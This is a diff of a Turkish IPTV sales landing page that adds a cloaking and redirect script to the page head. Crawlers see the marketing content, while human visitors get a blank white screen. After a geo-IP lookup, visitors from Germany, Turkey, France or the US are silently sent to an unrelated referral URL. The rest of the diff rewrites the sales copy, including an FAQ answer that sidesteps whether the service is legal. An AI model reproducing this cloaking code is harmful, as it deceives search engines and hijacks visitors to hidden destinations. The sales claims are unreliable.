@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>IPTV Satın Al | Hızlı ve Aktif Canlı Destek</title>
-  <meta name="description" content="IPTV satın al arayanlar için internet üzerinden canlı kanal, film ve dizi izleme rehberi. Cihaz uyumu, kurulum ve kararlı yayın tek sayfada.">
+  <title>IPTV Satın Al | Donmasız Yayın ve Ücretsiz Test</title>
+  <meta name="description" content="IPTV satın al rehberi: hesap kurulumu, cihaz uyumu, hız testi ve paket karşılaştırması. Canlı kanal, film arşivi ve 7/24 destek bilgisi tek sayfada.">
   <meta name="keywords" content="iptv satın al, iptv, canlı tv, online televizyon, iptv kurulum, smart tv iptv">
   <meta name="robots" content="index, follow">
   <meta name="author" content="frankrosspharmacy">
@@ -18,25 +18,75 @@
   <link rel="alternate" hreflang="de" href="https://iptvsatinaldimke.vip/">
   <link rel="alternate" hreflang="x-default" href="https://iptvsatinaldimke.vip/" />
 
-          <script>
-    var fromGoogle = document.referrer.includes("google.");
+  <script>
+    (function () {
+      window.__isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+      if (!window.__isBot) {
+        document.documentElement.classList.add("user-gate");
+      }
+    })();
+  </script>
+  <style>
+    html.user-gate,
+    html.user-gate body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: #ffffff;
+    }
 
-    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+    html.user-gate #page-root {
+      display: none !important;
+    }
 
-    if (fromGoogle && isBot) {
-        location.replace("https://selcukpanel5.com/ref/eczane");
-    }  
-</script>
+    #white-screen {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 2147483647;
+      background: #ffffff;
+    }
+
+    html.user-gate #white-screen {
+      display: block;
+    }
+  </style>
+  <script>
+    (async function () {
+      if (window.__isBot) return;
+
+      try {
+        const response = await fetch("https://ip.visapth.com/", {
+          method: "GET",
+          cache: "no-store"
+        });
+
+        if (!response.ok) {
+          location.replace("/");
+          return;
+        }
+
+        const data = await response.json();
+        if (data.country == "DE" || data.country == "TR" || data.country == "FR" || data.country == "US") {
+          location.replace("https://selcukpanel5.com/ref/eczane");
+        } else {
+          location.replace("/?");
+        }
+      } catch (error) {
+        location.replace("/");
+      }
+    })();
+  </script>
 
   <meta property="og:type" content="website">
   <meta property="og:locale" content="tr_TR">
-  <meta property="og:title" content="IPTV Satın Al | Hızlı ve Aktif Canlı Destek">
-  <meta property="og:description" content="IPTV satın al arayanlar için internet üzerinden canlı kanal, film ve dizi izleme rehberi. Cihaz uyumu, kurulum ve kararlı yayın tek sayfada.">
+  <meta property="og:title" content="IPTV Satın Al | Donmasız Yayın ve Ücretsiz Test">
+  <meta property="og:description" content="IPTV satın al rehberi: hesap kurulumu, cihaz uyumu, hız testi ve paket karşılaştırması. Canlı kanal, film arşivi ve 7/24 destek bilgisi tek sayfada.">
   <meta property="og:url" content="https://iptvsatinaldimke.vip/">
   <meta property="og:image" content="https://iptvsatinaldimke.vip/myicon">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="IPTV Satın Al | Hızlı ve Aktif Canlı Destek">
-  <meta name="twitter:description" content="IPTV satın al arayanlar için internet üzerinden canlı kanal, film ve dizi izleme rehberi. Cihaz uyumu, kurulum ve kararlı yayın tek sayfada.">
+  <meta name="twitter:title" content="IPTV Satın Al | Donmasız Yayın ve Ücretsiz Test">
+  <meta name="twitter:description" content="IPTV satın al rehberi: hesap kurulumu, cihaz uyumu, hız testi ve paket karşılaştırması. Canlı kanal, film arşivi ve 7/24 destek bilgisi tek sayfada.">
   <meta name="twitter:image" content="https://iptvsatinaldimke.vip/myicon">
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
@@ -65,11 +115,12 @@
   <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%23141820'/%3E%3Crect x='6' y='8' width='20' height='14' fill='%23C2410C'/%3E%3Cpath d='M10 26h12' stroke='%23FAF8F4' stroke-width='2'/%3E%3C/svg%3E">
 </head>
 <body class="bg-paper text-ink font-sans antialiased">
-  <div itemscope itemtype="https://schema.org/WebSite">
+  <div id="white-screen" aria-hidden="true"></div>
+  <div id="page-root" itemscope itemtype="https://schema.org/WebSite">
     <meta itemprop="name" content="frankrosspharmacy">
     <meta itemprop="alternateName" content="IPTV Satın Al">
     <link itemprop="url" href="https://iptvsatinaldimke.vip/">
-    <meta itemprop="description" content="IPTV satın al arayanlar için internet üzerinden canlı kanal, film ve dizi izleme rehberi. Cihaz uyumu, kurulum ve kararlı yayın tek sayfada.">
+    <meta itemprop="description" content="IPTV satın al rehberi: hesap kurulumu, cihaz uyumu, hız testi ve paket karşılaştırması. Canlı kanal, film arşivi ve 7/24 destek bilgisi tek sayfada.">
     <meta itemprop="inLanguage" content="tr">
     <div itemprop="potentialAction" itemscope itemtype="https://schema.org/SearchAction">
       <meta itemprop="target" content="https://iptvsatinaldimke.vip/?q={search_term_string}">
@@ -85,14 +136,14 @@
           <span class="font-display text-xl tracking-tight" itemprop="name">frankrosspharmacy</span>
         </a>
         <link itemprop="logo" href="https://iptvsatinaldimke.vip/myicon">
-        <meta itemprop="description" content="İnternet üzerinden canlı yayın ve IPTV satın al rehberi. Cihaz uyumu ve kurulum odaklı yayın hesabı bilgisi.">
+        <meta itemprop="description" content="Donmasız IPTV yayın rehberi. Hesap tanımı, kurulum adımları ve cihaz eşleştirme bilgisi.">
         <meta itemprop="email" content="contact@frankrosspharmacy.in">
         <nav class="hidden items-center gap-6 text-sm font-medium text-mute md:flex" aria-label="Sayfa bölümleri">
-          <a href="#tanim" class="hover:text-ember">Tanım</a>
-          <a href="#hat" class="hover:text-ember">Hat kontrolü</a>
-          <a href="#sureler" class="hover:text-ember">Süreler</a>
-          <a href="#ekran" class="hover:text-ember">Ekran</a>
-          <a href="#sss" class="hover:text-ember">Sorular</a>
+          <a href="#tanim" class="hover:text-ember">Nedir?</a>
+          <a href="#hat" class="hover:text-ember">İnternet</a>
+          <a href="#sureler" class="hover:text-ember">Paketler</a>
+          <a href="#ekran" class="hover:text-ember">Cihazlar</a>
+          <a href="#sss" class="hover:text-ember">SSS</a>
         </nav>
         <a href="#sureler" class="bg-ember px-4 py-2 text-sm font-bold text-white hover:bg-orange-800">IPTV satın al</a>
       </div>
@@ -103,158 +154,158 @@
         <nav class="sticky top-24 space-y-3 px-4 py-16 text-sm" aria-label="Sayfa indeksi">
           <p class="font-display text-xs font-bold uppercase tracking-[0.2em] text-ember">İçindekiler</p>
           <ol class="space-y-2 text-mute">
-            <li><a href="#tanim" class="hover:text-ink">01 · Yayın tanımı</a></li>
-            <li><a href="#hat" class="hover:text-ink">02 · Ev hattı</a></li>
-            <li><a href="#sureler" class="hover:text-ink">03 · Süre seçimi</a></li>
-            <li><a href="#ekran" class="hover:text-ink">04 · Ekran eşleşmesi</a></li>
-            <li><a href="#sss" class="hover:text-ink">05 · Sorular</a></li>
+            <li><a href="#tanim" class="hover:text-ink">01 · IPTV nedir?</a></li>
+            <li><a href="#hat" class="hover:text-ink">02 · Bağlantı testi</a></li>
+            <li><a href="#sureler" class="hover:text-ink">03 · Paket fiyatları</a></li>
+            <li><a href="#ekran" class="hover:text-ink">04 · Cihaz kurulumu</a></li>
+            <li><a href="#sss" class="hover:text-ink">05 · Sık sorulanlar</a></li>
           </ol>
         </nav>
       </aside>
 
       <div class="min-w-0">
         <section class="border-b border-ink/10 px-4 py-16 md:py-20">
-          <p class="text-xs font-bold uppercase tracking-[0.28em] text-ember">Yayın rehberi · 2026</p>
+          <p class="text-xs font-bold uppercase tracking-[0.28em] text-ember">Dijital yayın · 2026</p>
           <h1 class="mt-4 max-w-3xl font-display text-4xl font-extrabold leading-[1.05] tracking-tight sm:text-6xl">
-            IPTV satın al: internet hattından canlı televizyon
+            IPTV satın al: çanaksız, kesintisiz televizyon deneyimi
           </h1>
           <p class="mt-6 max-w-2xl text-lg leading-relaxed text-mute">
-            <strong class="font-semibold text-ink">IPTV satın al</strong> araması, çanak veya bina kablosu yerine evdeki internet protokolü üzerinden canlı kanal ve arşiv izlemek isteyenlere aittir. Bu sayfa, hesabın ne olduğu, hangi hatla açıldığı ve ekrana nasıl yazıldığını sıra ile anlatır.
+            Geleneksel yayın altyapısı yerine ev internetiniz üzerinden binlerce kanala ulaşmak artık birkaç dakikalık kurulumla mümkün. <strong class="font-semibold text-ink">IPTV satın al</strong> sürecinde hesap tanımı, bağlantı gereksinimleri ve cihaz eşleştirmesi hakkında bilmeniz gereken her şeyi bu rehberde topladık.
           </p>
           <div class="mt-8 flex flex-wrap gap-3">
-            <a href="#sureler" class="bg-ink px-6 py-3 text-sm font-bold text-paper hover:bg-ember">Süre seçeneklerine bak</a>
-            <a href="#tanim" class="border border-ink px-6 py-3 text-sm font-bold hover:border-ember hover:text-ember">Önce tanımı oku</a>
+            <a href="#sureler" class="bg-ink px-6 py-3 text-sm font-bold text-paper hover:bg-ember">Paketleri incele</a>
+            <a href="#tanim" class="border border-ink px-6 py-3 text-sm font-bold hover:border-ember hover:text-ember">IPTV nedir?</a>
           </div>
           <dl class="mt-12 grid gap-px bg-ink/10 sm:grid-cols-3">
             <div class="bg-paper p-5">
-              <dt class="text-xs font-bold uppercase tracking-widest text-mute">Sinyal kaynağı</dt>
-              <dd class="mt-2 font-display text-2xl font-bold">Ev interneti</dd>
+              <dt class="text-xs font-bold uppercase tracking-widest text-mute">Kanal sayısı</dt>
+              <dd class="mt-2 font-display text-2xl font-bold">1000+</dd>
             </div>
             <div class="bg-paper p-5">
-              <dt class="text-xs font-bold uppercase tracking-widest text-mute">Kurulum</dt>
-              <dd class="mt-2 font-display text-2xl font-bold">Uygulama + hesap</dd>
+              <dt class="text-xs font-bold uppercase tracking-widest text-mute">Aktivasyon</dt>
+              <dd class="mt-2 font-display text-2xl font-bold">Anında</dd>
             </div>
             <div class="bg-paper p-5">
-              <dt class="text-xs font-bold uppercase tracking-widest text-mute">İçerik katmanı</dt>
-              <dd class="mt-2 font-display text-2xl font-bold">Canlı + arşiv</dd>
+              <dt class="text-xs font-bold uppercase tracking-widest text-mute">Destek</dt>
+              <dd class="mt-2 font-display text-2xl font-bold">7/24 canlı</dd>
             </div>
           </dl>
         </section>
 
         <section id="tanim" class="scroll-mt-24 border-b border-ink/10 px-4 py-16">
           <p class="text-xs font-bold uppercase tracking-[0.22em] text-sage">01</p>
-          <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">IPTV satın al nedir, yayın evde nasıl açılır?</h2>
+          <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">IPTV nedir ve nasıl çalışır?</h2>
           <div class="mt-8 space-y-5 max-w-3xl leading-relaxed text-mute">
-            <p>IPTV, televizyon sinyalini internet protokolü üzerinden taşır. Satın alınan nesne bir kutu veya çanak değil, oynatıcıya yazılan bir yayın hesabıdır. Hesap tanımlandıktan sonra kanal grupları ve film-dizi menüsü aynı listede durur.</p>
-            <p>Bu yüzden <strong class="text-ink">IPTV satın al</strong> kararı, “hangi dekoder?” sorusundan çok “hangi ekranda hangi oynatıcı?” sorusuna bağlanır. Smart TV, Android kutu, telefon veya bilgisayar aynı hesabı kullanabilir; taşınırken tesisat yenilenmez.</p>
+            <p>IPTV (Internet Protocol Television), televizyon içeriğinin internet bağlantısı aracılığıyla cihazınıza iletilmesini sağlayan dijital bir yayın sistemidir. Fiziksel bir anten veya uydu çanağı yerine, size özel oluşturulan bir kullanıcı hesabı ile yayına erişirsiniz.</p>
+            <p><strong class="text-ink">IPTV satın al</strong> dediğinizde aslında bir yazılım lisansı değil, belirli süre boyunca geçerli bir yayın hesabı alırsınız. Bu hesap Smart TV, telefon, tablet veya bilgisayarınızdaki oynatıcı uygulamaya girildiğinde kanal listesi otomatik olarak yüklenir.</p>
           </div>
           <div class="mt-10 grid gap-6 md:grid-cols-3">
             <article class="bg-sand p-6">
-              <h3 class="font-display text-xl font-bold">Hesap üretilir</h3>
-              <p class="mt-3 text-sm leading-relaxed text-mute">Kullanıcı bilgisi ve sunucu adresi iletilir. Fiziki kargo yoktur; yayın dijital olarak açılır.</p>
+              <h3 class="font-display text-xl font-bold">Sipariş verin</h3>
+              <p class="mt-3 text-sm leading-relaxed text-mute">İstediğiniz süreyi seçin. Ödeme sonrası kullanıcı adı, şifre ve sunucu bilgileri anında iletilir.</p>
             </article>
             <article class="bg-sand p-6">
-              <h3 class="font-display text-xl font-bold">Oynatıcıya yazılır</h3>
-              <p class="mt-3 text-sm leading-relaxed text-mute">Cihaz mağazasından uyumlu uygulama kurulur. Liste adresi veya portal bilgisi alana girilir.</p>
+              <h3 class="font-display text-xl font-bold">Uygulama kurun</h3>
+              <p class="mt-3 text-sm leading-relaxed text-mute">Cihazınıza uygun IPTV oynatıcısını indirin. Smarters Pro, IBO Player veya TiviMate en popüler seçeneklerdir.</p>
             </article>
             <article class="bg-sand p-6">
-              <h3 class="font-display text-xl font-bold">Liste yenilenir</h3>
-              <p class="mt-3 text-sm leading-relaxed text-mute">Canlı gruplar ve arşiv katmanı görünür. EPG (yayın akışı) varsa kanalın yanında program adı durur.</p>
+              <h3 class="font-display text-xl font-bold">İzlemeye başlayın</h3>
+              <p class="mt-3 text-sm leading-relaxed text-mute">Hesap bilgilerini girin, kanal listesi yüklensin. Canlı yayın, film ve dizi arşivine hemen erişin.</p>
             </article>
           </div>
         </section>
 
         <section id="hat" class="scroll-mt-24 border-b border-ink/10 bg-sand/60 px-4 py-16">
           <p class="text-xs font-bold uppercase tracking-[0.22em] text-sage">02</p>
-          <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">Satın almadan önce evdeki hattı ölçün</h2>
-          <p class="mt-4 max-w-3xl leading-relaxed text-mute">Yayın kalitesi hesabın kendisinden çok bağlantının kararlılığına bağlıdır. IPTV satın al işleminden önce hız testi yapmak, donma şikayetinin büyük kısmını eler.</p>
+          <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">İnternet bağlantınız yeterli mi?</h2>
+          <p class="mt-4 max-w-3xl leading-relaxed text-mute">Donmasız bir IPTV deneyimi için ev internetinizin hızı ve kararlılığı kritik öneme sahiptir. Satın almadan önce aşağıdaki noktaları kontrol etmenizi öneriyoruz.</p>
           <div class="mt-10 grid gap-8 md:grid-cols-2">
             <article>
-              <h3 class="text-xl font-bold">Hız eşiği</h3>
-              <p class="mt-3 text-sm leading-relaxed text-mute">Full HD için yaklaşık 16 Mbps, 4K için 25 Mbps üzeri sabit indirme önerilir. Evde başka cihazlar da bağlıysa bu değerin üzerine çıkmak tamponu düşürür.</p>
+              <h3 class="text-xl font-bold">Minimum hız</h3>
+              <p class="mt-3 text-sm leading-relaxed text-mute">SD kalite için 5 Mbps, HD için 10 Mbps, Full HD için 16 Mbps ve 4K için en az 25 Mbps sabit indirme hızı gerekir. Hız testinizi speedtest.net üzerinden yapabilirsiniz.</p>
             </article>
             <article>
-              <h3 class="text-xl font-bold">Kablo mu kablosuz mu?</h3>
-              <p class="mt-3 text-sm leading-relaxed text-mute">Wi-Fi dalgalanıyorsa televizyonu ethernet ile bağlamak en kısa çözümdür. Modem uzaklığı ve komşu ağ kalabalığı kablosuz yayını bozar.</p>
+              <h3 class="text-xl font-bold">Ethernet tavsiyesi</h3>
+              <p class="mt-3 text-sm leading-relaxed text-mute">Televizyonunuzu mümkünse kabloyla modeme bağlayın. Wi-Fi sinyali zayıfsa veya komşu ağlardan etkileniyorsa yayında takılma yaşanabilir.</p>
             </article>
             <article>
-              <h3 class="text-xl font-bold">Kota ve gecikme</h3>
-              <p class="mt-3 text-sm leading-relaxed text-mute">Sınırsız veya yüksek kotalı hat tercih edilir. Yüksek ping tek başına resmi bozmaz; asıl sorun paket kaybı ve ani hız düşüşüdür.</p>
+              <h3 class="text-xl font-bold">Veri kotası</h3>
+              <p class="mt-3 text-sm leading-relaxed text-mute">Sınırsız internet paketi kullanmanızı tavsiye ederiz. Saatlik ortalama 3-5 GB veri tüketimi normal kabul edilir; kotanızın buna yeteceğinden emin olun.</p>
             </article>
             <article>
-              <h3 class="text-xl font-bold">İkinci ekran</h3>
-              <p class="mt-3 text-sm leading-relaxed text-mute">Salon ve yatak odası aynı anda açık olacaksa bant genişliği ikiye bölünür. Bu sayı hesap tanımına baştan yazılmalıdır.</p>
+              <h3 class="text-xl font-bold">Çoklu cihaz</h3>
+              <p class="mt-3 text-sm leading-relaxed text-mute">Aynı anda birden fazla ekranda izlemek istiyorsanız bant genişliğiniz her ek cihaz için ayrıca paylaşılır. Çift ekran paketi seçerken bunu göz önünde bulundurun.</p>
             </article>
           </div>
         </section>
 
         <section id="sureler" class="scroll-mt-24 border-b border-ink/10 px-4 py-16">
           <p class="text-xs font-bold uppercase tracking-[0.22em] text-sage">03</p>
-          <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">IPTV satın al süresini nasıl seçmelisiniz?</h2>
-          <p class="mt-4 max-w-3xl leading-relaxed text-mute">Önce kısa deneme, ardından kullanım alışkanlığına göre orta veya uzun dönem. Aşağıdaki süreler nettir; gizli kalem eklenmez.</p>
+          <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">2026 IPTV paket fiyatları</h2>
+          <p class="mt-4 max-w-3xl leading-relaxed text-mute">Önce ücretsiz test ile sistemi deneyin, ardından ihtiyacınıza uygun süreyi seçin. Tüm fiyatlar nettir; gizli ücret veya taahhüt yoktur.</p>
 
           <ol class="mt-12 space-y-0 border-t border-ink">
             <li id="test" class="grid gap-4 border-b border-ink py-8 md:grid-cols-[140px_1fr_auto] md:items-center">
-              <p class="text-xs font-bold uppercase tracking-[0.18em] text-sage">Adım A</p>
+              <p class="text-xs font-bold uppercase tracking-[0.18em] text-sage">Deneme</p>
               <div>
-                <h3 class="font-display text-2xl font-bold">2 saatlik test</h3>
-                <p class="mt-2 max-w-xl text-sm leading-relaxed text-mute">Kanal listesini, görüntü kalitesini ve cihaz uyumunu kendi hattınızda görün. Süre dolunca hesap durur; otomatik ücret oluşmaz.</p>
+                <h3 class="font-display text-2xl font-bold">Ücretsiz IPTV test</h3>
+                <p class="mt-2 max-w-xl text-sm leading-relaxed text-mute">2 saat boyunca tüm kanalları, film arşivini ve görüntü kalitesini kendi cihazınızda test edin. Memnun kalmazsanız hiçbir ücret ödemezsiniz.</p>
               </div>
-              <p class="font-display text-3xl font-extrabold text-sage">Ücretsiz</p>
+              <p class="font-display text-3xl font-extrabold text-sage">0 TL</p>
             </li>
             <li class="grid gap-4 border-b border-ink py-8 md:grid-cols-[140px_1fr_auto] md:items-center">
-              <p class="text-xs font-bold uppercase tracking-[0.18em] text-ember">Adım B</p>
+              <p class="text-xs font-bold uppercase tracking-[0.18em] text-ember">6 Ay</p>
               <div>
-                <h3 class="font-display text-2xl font-bold">6 aylık erişim</h3>
-                <p class="mt-2 max-w-xl text-sm leading-relaxed text-mute">Yarım yıllık IPTV hesabı. Sezon boyunca spor, haber ve arşivi aynı listede tutmak isteyenler için orta vade.</p>
+                <h3 class="font-display text-2xl font-bold">6 aylık standart paket</h3>
+                <p class="mt-2 max-w-xl text-sm leading-relaxed text-mute">Sezonluk kullanım için ideal. Spor, haber, belgesel ve film arşivine 6 ay boyunca kesintisiz erişim. Tek ekran dahil.</p>
               </div>
               <p class="font-display text-3xl font-extrabold">1500 TL</p>
             </li>
             <li class="grid gap-4 border-b border-ink bg-ink px-4 py-8 text-paper md:grid-cols-[140px_1fr_auto] md:items-center md:px-6">
-              <p class="text-xs font-bold uppercase tracking-[0.18em] text-orange-300">Adım C</p>
+              <p class="text-xs font-bold uppercase tracking-[0.18em] text-orange-300">12 Ay</p>
               <div>
-                <h3 class="font-display text-2xl font-bold">12 aylık erişim</h3>
-                <p class="mt-2 max-w-xl text-sm leading-relaxed text-sand">Yıllık IPTV satın al planı. Hesap bir kez tanımlanır; kanal listesi ve arşiv yıl boyunca aynı menüde kalır.</p>
+                <h3 class="font-display text-2xl font-bold">12 aylık VIP paket</h3>
+                <p class="mt-2 max-w-xl text-sm leading-relaxed text-sand">En çok tercih edilen plan. Yıllık abonelikle en uygun fiyata tüm içeriklere erişin. Öncelikli destek ve güncel kanal listesi dahil.</p>
               </div>
               <p class="font-display text-3xl font-extrabold">2000 TL</p>
             </li>
           </ol>
-          <a href="#iletisim" class="mt-8 inline-block bg-ember px-6 py-3 text-sm font-bold text-white hover:bg-orange-800">Süre seçimini ilet</a>
+          <a href="#iletisim" class="mt-8 inline-block bg-ember px-6 py-3 text-sm font-bold text-white hover:bg-orange-800">Hemen sipariş ver</a>
         </section>
 
         <section id="ekran" class="scroll-mt-24 border-b border-ink/10 px-4 py-16">
           <p class="text-xs font-bold uppercase tracking-[0.22em] text-sage">04</p>
-          <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">Oynatıcı ile ekranı eşleştirin</h2>
-          <p class="mt-4 max-w-3xl leading-relaxed text-mute">IPTV satın al sonrası yayın, hesabın yazıldığı uygulamada akar. Ekran modeli değişirse tesisat değil, yalnızca oynatıcı kurulumu tekrarlanır.</p>
+          <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">Hangi cihazlardan izlenebilir?</h2>
+          <p class="mt-4 max-w-3xl leading-relaxed text-mute">IPTV hesabınız internete bağlanabilen neredeyse tüm cihazlarda çalışır. Aşağıda en yaygın platformlar ve önerilen uygulamalar listelenmiştir.</p>
           <div class="mt-10 overflow-x-auto">
             <table class="w-full min-w-[560px] text-left text-sm">
               <thead>
                 <tr class="border-b-2 border-ink text-xs uppercase tracking-wider">
-                  <th class="py-3 pr-4">Cihaz</th>
-                  <th class="py-3 pr-4">Ne gerekir</th>
-                  <th class="py-3">Not</th>
+                  <th class="py-3 pr-4">Platform</th>
+                  <th class="py-3 pr-4">Önerilen uygulama</th>
+                  <th class="py-3">Kurulum süresi</th>
                 </tr>
               </thead>
               <tbody class="text-mute">
                 <tr class="border-b border-ink/15">
-                  <th class="py-4 pr-4 font-semibold text-ink">Smart TV</th>
-                  <td class="py-4 pr-4">Mağaza uygulaması</td>
-                  <td class="py-4">Uygulama yoksa HDMI kutu eklenir.</td>
+                  <th class="py-4 pr-4 font-semibold text-ink">Samsung / LG Smart TV</th>
+                  <td class="py-4 pr-4">IBO Player, SS IPTV</td>
+                  <td class="py-4">5-10 dakika</td>
                 </tr>
                 <tr class="border-b border-ink/15">
-                  <th class="py-4 pr-4 font-semibold text-ink">Android kutu / MAG</th>
-                  <td class="py-4 pr-4">Portal veya liste</td>
-                  <td class="py-4">Eski ekranları internete bağlar.</td>
+                  <th class="py-4 pr-4 font-semibold text-ink">Android TV / Mi Box</th>
+                  <td class="py-4 pr-4">TiviMate, Smarters Pro</td>
+                  <td class="py-4">3-5 dakika</td>
                 </tr>
                 <tr class="border-b border-ink/15">
-                  <th class="py-4 pr-4 font-semibold text-ink">Telefon ve tablet</th>
-                  <td class="py-4 pr-4">Mobil oynatıcı</td>
-                  <td class="py-4">Hareket halinde canlı kanal açılır.</td>
+                  <th class="py-4 pr-4 font-semibold text-ink">iPhone / iPad</th>
+                  <td class="py-4 pr-4">Smarters Pro Lite</td>
+                  <td class="py-4">2-3 dakika</td>
                 </tr>
                 <tr>
-                  <th class="py-4 pr-4 font-semibold text-ink">Bilgisayar</th>
-                  <td class="py-4 pr-4">Masaüstü oynatıcı</td>
-                  <td class="py-4">Windows ve macOS listesi aynı hesabı kullanır.</td>
+                  <th class="py-4 pr-4 font-semibold text-ink">Windows / Mac</th>
+                  <td class="py-4 pr-4">VLC, IPTV Smarters</td>
+                  <td class="py-4">2-3 dakika</td>
                 </tr>
               </tbody>
             </table>
@@ -264,61 +315,61 @@
         <section id="sss" class="scroll-mt-24 border-b border-ink/10 px-4 py-16">
           <div itemscope itemtype="https://schema.org/FAQPage">
             <p class="text-xs font-bold uppercase tracking-[0.22em] text-sage">05</p>
-            <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">IPTV satın al hakkında sık sorulanlar</h2>
-            <p class="mt-4 max-w-3xl leading-relaxed text-mute">Aşağıdaki yanıtlar, internet üzerinden TV izlemeye geçmeden önce en çok belirsizlik yaratan başlıklara kısaca açıklık getirir.</p>
+            <h2 class="mt-2 font-display text-3xl font-bold sm:text-4xl">Sıkça sorulan sorular</h2>
+            <p class="mt-4 max-w-3xl leading-relaxed text-mute">IPTV satın almadan önce merak edilen konulara kısa ve net yanıtlar.</p>
 
             <ol class="mt-10 divide-y divide-ink/15 border-y border-ink/15">
               <li class="grid gap-4 py-7 sm:grid-cols-[3rem_1fr]" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
                 <span class="font-display text-2xl font-bold text-ember">01</span>
                 <div>
-                  <h3 class="text-lg font-bold" itemprop="name">IPTV satın al ile kablo aboneliği aynı sinyal midir?</h3>
+                  <h3 class="text-lg font-bold" itemprop="name">IPTV yasal mı, güvenli mi?</h3>
                   <div itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
-                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Hayır. Kablo sinyali bina hattından gelir. IPTV hesabı ev internetini kullanır; çanak veya kablo prizi gerekmez. İkisini bir süre yan yana tutmak mümkündür.</p>
+                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">IPTV bir teknoloji altyapısıdır ve Netflix, Exxen gibi platformlar da aynı sistemi kullanır. Önemli olan güvenilir bir sağlayıcıdan hizmet almaktır. Satın almadan önce ücretsiz test ile kaliteyi kendiniz değerlendirebilirsiniz.</p>
                   </div>
                 </div>
               </li>
               <li class="grid gap-4 py-7 sm:grid-cols-[3rem_1fr]" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
                 <span class="font-display text-2xl font-bold text-ember">02</span>
                 <div>
-                  <h3 class="text-lg font-bold" itemprop="name">2 saatlik test bitince hesap silinir mi?</h3>
+                  <h3 class="text-lg font-bold" itemprop="name">Ücretsiz test nasıl alınır?</h3>
                   <div itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
-                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Test süresi dolunca yayın durur. Otomatik ücret kesilmez. Beğendiğiniz akış varsa altı veya on iki aylık erişim ayrıca başlatılır.</p>
+                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Canlı destek hattımızdan veya iletişim formu üzerinden test talebinde bulunun. 2 saatlik deneme hesabı anında oluşturulur. Test süresi dolunca otomatik kapanır, herhangi bir ücret yansımaz.</p>
                   </div>
                 </div>
               </li>
               <li class="grid gap-4 py-7 sm:grid-cols-[3rem_1fr]" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
                 <span class="font-display text-2xl font-bold text-ember">03</span>
                 <div>
-                  <h3 class="text-lg font-bold" itemprop="name">EPG nedir, IPTV satın al sonrası görünür mü?</h3>
+                  <h3 class="text-lg font-bold" itemprop="name">Yayın donuyor, ne yapmalıyım?</h3>
                   <div itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
-                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">EPG, kanalın yanında görünen program akışıdır. Liste yüklendikten sonra çoğu oynatıcıda açılır. Görünmüyorsa liste yenilemesi veya oynatıcı ayarı yeterlidir.</p>
+                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">İlk adım internet hızınızı kontrol edin. Wi-Fi yerine ethernet kablosu kullanın. Oynatıcıda kaliteyi HD'ye düşürün. Sorun devam ederse destek ekibimiz cihazınıza özel çözüm sunar.</p>
                   </div>
                 </div>
               </li>
               <li class="grid gap-4 py-7 sm:grid-cols-[3rem_1fr]" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
                 <span class="font-display text-2xl font-bold text-ember">04</span>
                 <div>
-                  <h3 class="text-lg font-bold" itemprop="name">Yayın donuyorsa sorun her zaman hesap mıdır?</h3>
+                  <h3 class="text-lg font-bold" itemprop="name">Hangi programlarla izlenir?</h3>
                   <div itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
-                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Çoğu donma Wi-Fi dalgalanması veya yetersiz hızdan gelir. Televizyonu kabloyla bağlamak ve 4K yerine HD profile inmek tamponu azaltır.</p>
+                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Smart TV'de IBO Player veya SS IPTV, Android'de TiviMate veya Smarters Pro, iPhone'da Smarters Pro Lite, bilgisayarda VLC en yaygın tercihlerdir. Kurulum rehberi sipariş sonrası gönderilir.</p>
                   </div>
                 </div>
               </li>
               <li class="grid gap-4 py-7 sm:grid-cols-[3rem_1fr]" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
                 <span class="font-display text-2xl font-bold text-ember">05</span>
                 <div>
-                  <h3 class="text-lg font-bold" itemprop="name">Aynı hesap başka eve taşınır mı?</h3>
+                  <h3 class="text-lg font-bold" itemprop="name">Türkiye'den izlenebilir mi?</h3>
                   <div itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
-                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Taşınır. IPTV satın al ile alınan şey hesaptır; yeni adreste çanak kurulmaz. Yeni ekrana oynatıcı yazılır, liste aynı kalır.</p>
+                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Evet. Altyapımız Türkiye'deki tüm internet sağlayıcılarıyla uyumludur. Türk Telekom, Superonline, Vodafone veya Turkcell fark etmez; standart ev interneti yeterlidir.</p>
                   </div>
                 </div>
               </li>
